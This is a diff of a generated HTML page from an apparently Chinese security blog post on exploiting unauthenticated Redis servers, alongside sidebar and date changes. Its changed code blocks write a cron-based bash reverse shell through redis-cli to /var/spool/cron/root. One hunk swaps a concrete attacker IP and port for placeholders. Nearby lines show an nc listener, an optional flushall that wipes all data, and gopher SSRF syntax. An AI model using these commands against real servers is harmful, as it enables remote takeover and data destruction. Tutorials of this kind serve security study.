@@ -436,7 +436,7 @@ height:50vh;
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvp <span class="number">9669</span></span><br></pre></td></tr></table></figure>
 
 <p>写入定时命令，这里用的 <code>bash</code> ，其他弹法改下语句就行。本地 Ubuntu 弹失败了，再试试 py 看看。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set x "n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/vps_ip/port 0&gt;&amp;1\n\n"</span><br><span class="line">set x "\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/47.101.220.241/9669 0&gt;&amp;1\n\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set x "n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/vps_ip/port 0&gt;&amp;1\n\n"</span><br><span class="line">set x "\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 
 <p>不同系统（发行版）的定时任务文件所在路径可能不同，以实际系统为准。</p>
 <h3 id="写-webshell"><a href="#写-webshell" class="headerlink" title="写 webshell"></a>写 webshell</h3><p>当服务器开着 web 服务，而且 redis 有 web 目录写权限时，可以尝试写 webshell。</p>
@@ -459,7 +459,7 @@ height:50vh;
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/_ + 数据</span><br></pre></td></tr></table></figure>
 
 <p>TODO：单独写一篇总结</p>
-<h3 id="具体玩法"><a href="#具体玩法" class="headerlink" title="具体玩法"></a>具体玩法</h3><p>反弹脚本，上面已经讲了，这只是写成 <code>shell</code> 形式。</p>
+<h3 id="具体玩法"><a href="#具体玩法" class="headerlink" title="具体玩法"></a>具体玩法</h3><p>写一个反弹脚本，方便抓流量。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall  <span class="comment"># 无法成功时再试试这句，将清掉所有数据</span></span></span><br><span class="line">echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure>
 
 <p>输出四个 “ok” 即为写入成功。</p>
@@ -544,7 +544,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/">https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/">May 17th 2019, 9:49:23 pm</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/">July 2nd 2019, 3:14:45 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/">August 11th 2019, 5:50:18 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1179,14 +1179,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 35
@@ -1339,12 +1331,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
@@ -1396,13 +1388,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
-        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
